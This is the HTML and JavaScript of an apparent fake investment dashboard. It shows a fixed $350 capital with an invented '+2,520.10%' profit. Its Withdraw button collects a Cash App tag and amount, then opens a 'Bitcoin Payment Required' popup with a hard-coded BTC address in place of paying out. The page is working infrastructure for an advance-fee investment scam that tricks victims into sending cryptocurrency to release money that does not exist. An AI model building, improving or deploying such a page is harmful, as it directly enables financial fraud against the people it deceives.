<!DOCTYPE html>
<html>
<head>
  <title>Investment Account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
</head>

<!-- Withdraw Popup 1 -->
<div id="withdrawPopup" class="popup">
  <div class="popup-box">
    <h3>Withdraw Funds</h3>

    <input type="text" id="cashTag" placeholder="Enter Cash App Tag" required>
    <input type="number" id="withdrawAmount" placeholder="Enter Amount" required>

    <button onclick="submitWithdraw()">Withdraw</button>
    <button class="close-btn" onclick="closePopup()">Cancel</button>
  </div>
</div>

<!-- BTC Address Popup -->
<div id="btcPopup" class="popup">
  <div class="popup-box">
    <h3>Bitcoin Payment Required</h3>

    <p style="margin-bottom:10px;">Please copy the address</p>

    <div class="btc-box">
      <input type="text" id="btcAddress" 
      value="bc1qd7vuq63a2e0zxqgt67u46gjk3fqj740fujwz0t" readonly>
      <button onclick="copyBTC()">Copy</button>
    </div>

    <button class="close-btn" onclick="closeBTCPopup()">Close</button>
  </div>
</div>

  
<body>

<!-- HEADER -->
<div class="header">
  <h2>Investment Account</h2>
  <button class="logout-btn" onclick="logout()">Logout</button>
</div>

<div class="dashboard">

  <!-- Welcome -->
  <div class="welcome">
    <img src="jp.jpeg" alt="Profile">
    <h3>Welcome, <span id="username"></span></h3>
  </div>

  <!-- Capital & Profit -->
  <div class="card-row">
    <div class="card">
      <h3>Invested Capital</h3>
      <div class="card-value">$350</div>
    </div>

    <div class="card">
      <h3>Accumulated Profits</h3>
      <div class="card-value blue" id="profits"></div>
    </div>
  </div>

  <!-- Total Value -->
  <div class="total-card">
    <h2>Total Account Value</h2>
    <div class="total-value" id="total"></div>
    <div class="profit">+2,520.10% ▲</div>
  </div>

  <!-- Withdraw BELOW total -->
  <div class="withdraw-container">
    <button class="withdraw-btn" onclick="openPopup()">Withdraw</button>
  </div>

</div>

<script>
  
  const name = localStorage.getItem("name");
  const balance = parseFloat(localStorage.getItem("balance"));

  if (!name) {
    window.location.href = "login.html";
  }

  document.getElementById("username").innerText = name;

  const capital = 350;
  const profits = balance - capital;

  document.getElementById("total").innerText = "$" + balance.toFixed(2);
  document.getElementById("profits").innerText = "$" + profits.toFixed(2);

  function logout() {
    localStorage.clear();
    window.location.href = "login.html";
  }

function openPopup() {
  document.getElementById("withdrawPopup").style.display = "flex";
}

function closePopup() {
  document.getElementById("withdrawPopup").style.display = "none";
}

function submitWithdraw() {
  const tag = document.getElementById("cashTag").value;
  const amount = document.getElementById("withdrawAmount").value;

  if (!tag || !amount) {
    alert("Please fill all fields");
    return;
  }

  closePopup();
  document.getElementById("btcPopup").style.display = "flex";
}

function closeBTCPopup() {
  document.getElementById("btcPopup").style.display = "none";
}

function copyBTC() {
  const btcInput = document.getElementById("btcAddress");
  btcInput.select();
  btcInput.setSelectionRange(0, 99999);
  document.execCommand("copy");
  alert("Address copied!");
}  
</script>

</body>
</html>
